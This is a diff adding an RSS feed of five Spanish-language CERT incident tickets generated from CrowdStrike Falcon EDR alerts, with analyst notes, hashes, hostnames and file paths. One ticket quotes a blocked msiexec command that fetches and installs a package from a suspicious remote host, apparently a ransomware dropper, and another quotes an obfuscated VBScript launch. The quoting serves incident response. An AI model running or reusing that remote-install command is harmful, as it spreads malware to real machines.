@@ -1,0 +1,340 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<rdf:RDF
+ xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+ xmlns="http://purl.org/rss/1.0/"
+ xmlns:admin="http://webns.net/mvcb/"
+ xmlns:content="http://purl.org/rss/1.0/modules/content/"
+ xmlns:dc="http://purl.org/dc/elements/1.1/"
+ xmlns:syn="http://purl.org/rss/1.0/modules/syndication/"
+ xmlns:taxo="http://purl.org/rss/1.0/modules/taxonomy/"
+>
+
+<channel rdf:about="https://xxxx.xxxxxxxxxxxxxxx.xx:443/">
+<title>AndaluciaCERT: Search Queue = &#x27;Incident Reports - AndaluciaCERT&#x27; AND Created &#x3E; &#x27;2024-02-01&#x27; AND (  Subject LIKE &#x27;CrowdStrike EDR.&#x27; OR Subject LIKE &#x27;ADA-EDR&#x27; OR Subject LIKE &#x27;Falcon CS&#x27; OR Subject LIKE &#x27;ADA - CS&#x27; OR Subject LIKE &#x27;ADA - CrowdStrike Falcon&#x27; )</title>
+<link>https://xxxx.xxxxxxxxxxxxxxx.xx:443/</link>
+<description></description>
+<syn:updateBase>2025-05-08T00:00:00Z</syn:updateBase>
+<syn:updateFrequency>1</syn:updateFrequency>
+<syn:updatePeriod>hourly</syn:updatePeriod>
+<items>
+ <rdf:Seq>
+  <rdf:li rdf:resource="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232709" />
+  <rdf:li rdf:resource="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232687" />
+  <rdf:li rdf:resource="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232658" />
+  <rdf:li rdf:resource="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232644" />
+  <rdf:li rdf:resource="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232643" />
+ </rdf:Seq>
+</items>
+</channel>
+<item rdf:about="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232709">
+<title>ADA-EDR [High] - Execution - Command and Scripting Interpreter - CAP42008P00K</title>
+<link>https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232709</link>
+<description>Crowdstrike Email
+
+ CrowdStrike Logo &#x26;#40;#&#x26;#41; 
+
+Buenas, se ha detectado una alerta en Falcon, a continuaci&#xF3;n os aportamos los
+detalles.
+
+AN&#xC1;LISIS T&#xC9;CNICO:
+LUCIA -- TSANIT
+Se detecta y bloquea el lanzamiento de un script Visual Basic:
+&#x26;#34;C:\Windows\system32\wscript.exe&#x26;#34; //E:vbscript MSShell32 /e
+&#x26;#34;#######_____CHARLAS____VISITAS&#x26;#34; c4bbf69c54 C3H1JCMP0GR
+
+Se solicita la verificaci&#xF3;n de esta acci&#xF3;n por parte del usuario; si estas
+acciones son ileg&#xED;timas, realizar la eliminaci&#xF3;n de los archivos asociados y
+comprobar posibles s&#xED;ntomas de infecci&#xF3;n en el equipo &#x26;#40;tareas programadas,
+servicios...&#x26;#41;.
+
+Los datos mostrados a continuaci&#xF3;n son extra&#xED;dos y adjuntados autom&#xE1;ticamente
+por la plataforma y pueden no ser completamente precisos. En caso de duda o
+contradicci&#xF3;n prevalecer&#xE1;n siempre los datos aportados en el An&#xE1;lisis T&#xE9;cnico.
+
+DATOS DE LA DETECCI&#xD3;N:
+- Enlace:
+https://falcon.eu-1.crowdstrike.com/activity-v2
+- Fecha y Hora: 2025-05-08T06:40:04Z UTC
+- Archivo: wscript.exe
+- Hash: 50e5f8886b41daaf55cde9e4b801145d27d682e3f0bc1b02840f5ed9d4656d29
+- IOC Type: SHA256 hash
+- IOC Value: 50e5f8886b41daaf55cde9e4b801145d27d682e3f0bc1b02840f5ed9d4656d29
+- Ruta archivo: \Device\HarddiskVolume2\Windows\System32\wscript.exe
+- Ruta Adicional:
+- Command Line: &#x26;#34;C:\Windows\system32\wscript.exe&#x26;#34; //E:vbscript MSShell32 /e
+&#x26;#34;#######_____CHARLAS____VISITAS&#x26;#34; c4bbf69c54 C3H1JCMP0GR
+- Severidad: High
+- Actuaci&#xF3;n CS: Prevention, process blocked from execution
+- T&#xE1;ctica: Execution
+- T&#xE9;cnica: Command and Scripting Interpreter
+
+DATOS DEL EQUIPO:
+- Tenant: 65a33b216a10460b9e550319f9a19548
+- Hostname: CAP42008P00K
+- Dominio: dominio.algo.loquesea
+- Usuario: NombreDelUsuario
+- IP local: 10.20.30.40
+- IP externa: 100.110.120.130
+- M&#xE1;quina: Workstation
+- Sist. Op: Windows 11
+- Grouping Tags:
+[&#x26;#34;SensorGroupingTags/CADIZ&#x26;#34;,&#x26;#34;SensorGroupingTags/PC&#x26;#34;,&#x26;#34;SensorGroupingTags/FASE3-AVCS&#x26;#34;]
+
+Un saludo.
+
+
+ Copyright &#xA9; 2025 CrowdStrike, Inc. All rights reserved. 
+</description>
+<dc:creator>&#x3C;falcon@crowdstrike.com&#x3E;</dc:creator>
+<dc:date>2025-05-08T06:54:02Z</dc:date>
+</item>
+<item rdf:about="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232687">
+<title>ADA-EDR [Medium] - Custom Intelligence - Indicator of Compromise - GR3C-INF0PSGR01</title>
+<link>https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232687</link>
+<description>Crowdstrike Email
+
+ CrowdStrike Logo &#x26;#40;#&#x26;#41; 
+
+Buenas, se ha detectado una alerta en Falcon, a continuaci&#xF3;n os aportamos los
+detalles.
+
+AN&#xC1;LISIS T&#xC9;CNICO:
+LUCIA -- TJUST
+Se detecta un software PUP catalogado como troyano. Relacionado con htaa.dll.
+Se ha detectado este mismo archivo en m&#xE1;s ocasiones en el organismo, siempre
+asociado a tareas de backup; puede encontrarse alojado en alg&#xFA;n repositorio
+com&#xFA;n.
+Path:\Device\HarddiskVolume3\Users\usuario\Desktop\BACKUPS\GR3C-0002-AUJ01-957834\usuario\AppData\Local\Temp\vaysoft\temp\{39E6051A-38E0-4CE3-B0EA-EB9898694BE3}\option\htaa.dll
+Hash: 5949467c058abf8cd881c0af9fcd39117014ceb68016eca89f22c40c6db86d5e
+
+Se solicita la eliminaci&#xF3;n de los archivos asociados a la detecci&#xF3;n, y la
+posterior comprobaci&#xF3;n del equipo.
+
+Los datos mostrados a continuaci&#xF3;n son extra&#xED;dos y adjuntados autom&#xE1;ticamente
+por la plataforma y pueden no ser completamente precisos. En caso de duda o
+contradicci&#xF3;n prevalecer&#xE1;n siempre los datos aportados en el An&#xE1;lisis T&#xE9;cnico.
+
+DATOS DE LA DETECCI&#xD3;N:
+- Enlace:
+https://falcon.eu-1.crowdstrike.com/activity-v2/
+- Fecha y Hora: 2025-05-08T05:38:30Z UTC
+- Archivo: explorer.exe
+- Hash: 5949467c058abf8cd881c0af9fcd39117014ceb68016eca89f22c40c6db86d5e
+- IOC Type: SHA256 hash
+- IOC Value: 5949467c058abf8cd881c0af9fcd39117014ceb68016eca89f22c40c6db86d5e
+- Ruta archivo: \Device\HarddiskVolume3\Windows\explorer.exe
+- Ruta Adicional:
+[{&#x26;#34;FilePath&#x26;#34;:&#x26;#34;\\Device\\HarddiskVolume3\\Users\\usuario\\Desktop\\BACKUPS\\GR3C-0002-AUJ01-957834\\usuario\\AppData\\Local\\Temp\\vaysoft\\temp\\{010045CE-508E-404A-BCCE-1860B10C8FC7}\\option\\htaa.dll&#x26;#34;,&#x26;#34;SHA256&#x26;#34;:&#x26;#34;5949467c058abf8cd881c0af9fcd39117014ceb68016eca89f22c40c6db86d5e&#x26;#34;}]
+- Command Line: &#x26;#34;C:\Windows\explorer.exe&#x26;#34; /LOADSAVEDWINDOWS
+- Severidad: Medium
+- Actuaci&#xF3;n CS: Endpoint detection, standard detection
+- T&#xE1;ctica: Custom Intelligence
+- T&#xE9;cnica: Indicator of Compromise
+
+DATOS DEL EQUIPO:
+- Tenant: 3f8a7c04ca0247179625c328dcf57b86
+- Hostname: GR3C-INF0PSGR01
+- Dominio: dominio.algo.loquesea
+- Usuario: NombreDelUsuario
+- IP local: 10.20.30.40
+- IP externa: 100.110.120.130
+- M&#xE1;quina: Workstation
+- Sist. Op: Windows 10
+- Grouping Tags:
+
+Un saludo.
+
+
+
+ Copyright &#xA9; 2025 CrowdStrike, Inc. All rights reserved. 
+</description>
+<dc:creator>&#x3C;falcon@crowdstrike.com&#x3E;</dc:creator>
+<dc:date>2025-05-08T05:48:02Z</dc:date>
+</item>
+<item rdf:about="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232658">
+<title>ADA-EDR [High] - Defense Evasion - Disable or Modify Tools - SEP02007A18M</title>
+<link>https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232658</link>
+<description>Crowdstrike Email
+
+ CrowdStrike Logo &#x26;#40;#&#x26;#41; 
+
+Buenas, se ha detectado una alerta en Falcon, a continuaci&#xF3;n os aportamos los
+detalles.
+
+AN&#xC1;LISIS T&#xC9;CNICO:
+LUCIA. TSANIT.
+
+Se ha detectado un intento de tampering en este equipo.
+Se ha intentado eliminar un archivo 000245.sst
+de la carpeta de base de datos de crowdstrike.
+
+Se recomienda verificar dicha acci&#xF3;n y a ser posible
+informar sobre esta actividad lo antes posible, para tener
+mas informaci&#xF3;n sobre este hecho.
+
+Los datos mostrados a continuaci&#xF3;n son extra&#xED;dos y adjuntados autom&#xE1;ticamente
+por la plataforma y pueden no ser completamente precisos. En caso de duda o
+contradicci&#xF3;n prevalecer&#xE1;n siempre los datos aportados en el An&#xE1;lisis T&#xE9;cnico.
+
+DATOS DE LA DETECCI&#xD3;N:
+- Enlace:
+https://falcon.eu-1.crowdstrike.com/activity-v2/
+- Fecha y Hora: 2025-05-07T12:45:59Z UTC
+- Archivo: wininit.exe
+- Hash: 21da0122ba7b723adad041969bded52eefa99b47571670599bc03b3d7e1e3788
+- IOC Type:
+- IOC Value:
+- Ruta archivo: \Device\HarddiskVolume2\Windows\System32\wininit.exe
+- Ruta Adicional:
+- Command Line: wininit.exe
+- Severidad: High
+- Actuaci&#xF3;n CS: File system Operation Blocked
+- T&#xE1;ctica: Defense Evasion
+- T&#xE9;cnica: Disable or Modify Tools
+
+DATOS DEL EQUIPO:
+- Tenant: 65a33b216a10460b9e550319f9a19548
+- Hostname: SEP02007A18M
+- Dominio: dominio.algo.loquesea
+- Usuario: NombreDelUsuario$
+- IP local: 10.20.30.40
+- IP externa: 100.110.120.130
+- M&#xE1;quina: Workstation
+- Sist. Op: Windows 10
+- Grouping Tags:
+[&#x26;#34;SensorGroupingTags/SEVILLA&#x26;#34;,&#x26;#34;SensorGroupingTags/PC&#x26;#34;,&#x26;#34;SensorGroupingTags/FASE3-AVCS&#x26;#34;]
+
+Un saludo.
+
+
+
+ Copyright &#xA9; 2025 CrowdStrike, Inc. All rights reserved. 
+</description>
+<dc:creator>&#x3C;falcon@crowdstrike.com&#x3E;</dc:creator>
+<dc:date>2025-05-07T13:14:02Z</dc:date>
+</item>
+<item rdf:about="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232644">
+<title>ADA-EDR [High] - Defense Evasion - Process Hollowing - MAP02029AYR8</title>
+<link>https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232644</link>
+<description>Crowdstrike Email
+
+ CrowdStrike Logo &#x26;#40;#&#x26;#41; 
+
+Buenas, se ha detectado una alerta en Falcon, a continuaci&#xF3;n os aportamos los
+detalles.
+
+AN&#xC1;LISIS T&#xC9;CNICO:
+LUCIA -- TSANIT
+Se ha ejecutado una l&#xED;nea de comando que trata de contactar con un dominio
+potencialmente malicioso, en la cadena de comando se pasan los identificadores
+del equipo. Probablemente el objetivo era descargar y ejecutar un ransomware.
+Se recomienda revisar el equipo en busca de indicios de infecci&#xF3;n.
+
+Los datos mostrados a continuaci&#xF3;n son extra&#xED;dos y adjuntados autom&#xE1;ticamente
+por la plataforma y pueden no ser completamente precisos. En caso de duda o
+contradicci&#xF3;n prevalecer&#xE1;n siempre los datos aportados en el An&#xE1;lisis T&#xE9;cnico.
+
+DATOS DE LA DETECCI&#xD3;N:
+- Enlace:
+https://falcon.eu-1.crowdstrike.com/activity-v2/
+- Fecha y Hora: 2025-05-07T12:21:00Z UTC
+- Archivo: msiexec.exe
+- Hash: ea2aa4ed1ff50d0f2e0a9c1df1960265aa28bf8da542469c0530a09b6da445d2
+- IOC Type: SHA256 hash
+- IOC Value: ea2aa4ed1ff50d0f2e0a9c1df1960265aa28bf8da542469c0530a09b6da445d2
+- Ruta archivo: \Device\HarddiskVolume3\Windows\System32\msiexec.exe
+- Ruta Adicional:
+- Command Line: msieXec AzX=KrKU tNLATuvmR=OnMsowZd yTk=AcQZkozu -q /FV
+&#x26;#34;Http://0v.WF:8080/BmBeENumI/nARYhMJoudNMPyDp3YLjeqDRNxuSrC/MAP02029AYR8?garciajoaquin32p&#x26;#34;
+CM=gGI
+- Severidad: High
+- Actuaci&#xF3;n CS: Prevention, process blocked from execution
+- T&#xE1;ctica: Defense Evasion
+- T&#xE9;cnica: Process Hollowing
+
+DATOS DEL EQUIPO:
+- Tenant: 65a33b216a10460b9e550319f9a19548
+- Hostname: MAP02029AYR8
+- Dominio: dominio.algo.loquesea
+- Usuario: NombreDelUsuario
+- IP local: 10.20.30.40
+- IP externa: 100.110.120.130
+- M&#xE1;quina: Workstation
+- Sist. Op: Windows 11
+- Grouping Tags:
+[&#x26;#34;SensorGroupingTags/MALAGA&#x26;#34;,&#x26;#34;SensorGroupingTags/PC&#x26;#34;,&#x26;#34;SensorGroupingTags/FASE3-AVCS&#x26;#34;]
+
+Un saludo.
+
+
+
+ Copyright &#xA9; 2025 CrowdStrike, Inc. All rights reserved. 
+</description>
+<dc:creator>&#x3C;falcon@crowdstrike.com&#x3E;</dc:creator>
+<dc:date>2025-05-07T12:36:03Z</dc:date>
+</item>
+<item rdf:about="https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232643">
+<title>ADA-EDR [Medium] - Machine Learning - Cloud-based ML - ALP03005P5J4</title>
+<link>https://xxxxx.xxxxxxx.xxxxx-xxxxxxxxx.xx:443/Ticket/Display.html?id=232643</link>
+<description>Crowdstrike Email
+
+ CrowdStrike Logo &#x26;#40;#&#x26;#41; 
+
+Buenas, se ha detectado una alerta en Falcon, a continuaci&#xF3;n os aportamos los
+detalles.
+
+AN&#xC1;LISIS T&#xC9;CNICO:
+LUCIA /// TSANIT
+Se ha detectado y bloqueado un ejecutable desconocido
+&#x26;#34;MIRON - Monitorear memorias - v10.62.exe&#x26;#34;
+El hash de dicho aejecutable no devuelve resultados.
+Aunque no parece software corporativo, debido a su bloqueo solicitamos
+informacion por si procediese su exclusion
+
+Los datos mostrados a continuaci&#xF3;n son extra&#xED;dos y adjuntados autom&#xE1;ticamente
+por la plataforma y pueden no ser completamente precisos. En caso de duda o
+contradicci&#xF3;n prevalecer&#xE1;n siempre los datos aportados en el An&#xE1;lisis T&#xE9;cnico.
+
+DATOS DE LA DETECCI&#xD3;N:
+- Enlace:
+https://falcon.eu-1.crowdstrike.com/activity-v2/
+- Fecha y Hora: 2025-05-07T12:16:08Z UTC
+- Archivo: MIRON - Monitorear memorias - v10.62.exe
+- Hash: ee46fa63a6eeeb3314056b1bf9126853bc8fcf8f6df22af8247cbb2b09eed11e
+- IOC Type: SHA256 hash
+- IOC Value: ee46fa63a6eeeb3314056b1bf9126853bc8fcf8f6df22af8247cbb2b09eed11e
+- Ruta archivo: \Device\HarddiskVolume13\JOSE\Intaladores\Mis
+Intaladores\2024\MIRON v10 - Para los Negocios que copian Novelas y Pel&#xED;culas
+[18.36 Mb]\MIRON - Monitorear memorias - v10.62.exe
+- Ruta Adicional:
+- Command Line: &#x26;#34;F:\JOSE\Intaladores\Mis Intaladores\2024\MIRON v10 - Para los
+Negocios que copian Novelas y Pel&#xED;culas [18.36 Mb]\MIRON - Monitorear memorias
+- v10.62.exe&#x26;#34;
+- Severidad: Medium
+- Actuaci&#xF3;n CS: Prevention/Quarantine, process was blocked from execution and
+quarantine was attempted
+- T&#xE1;ctica: Machine Learning
+- T&#xE9;cnica: Cloud-based ML
+
+DATOS DEL EQUIPO:
+- Tenant: 65a33b216a10460b9e550319f9a19548
+- Hostname: ALP03005P5J4
+- Dominio: dominio.algo.loquesea
+- Usuario: NombreDelUsuario
+- IP local: 192.168.1.18
+- IP externa: 100.110.120.130
+- M&#xE1;quina: Workstation
+- Sist. Op: Windows 10
+- Grouping Tags:
+[&#x26;#34;SensorGroupingTags/ALMERIA&#x26;#34;,&#x26;#34;SensorGroupingTags/PC&#x26;#34;,&#x26;#34;SensorGroupingTags/FASE3-AVCS&#x26;#34;]
+
+Un saludo.
+
+
+ Copyright &#xA9; 2025 CrowdStrike, Inc. All rights reserved. 
+</description>
+<dc:creator>&#x3C;falcon@crowdstrike.com&#x3E;</dc:creator>
+<dc:date>2025-05-07T12:36:02Z</dc:date>
+</item>
+</rdf:RDF>
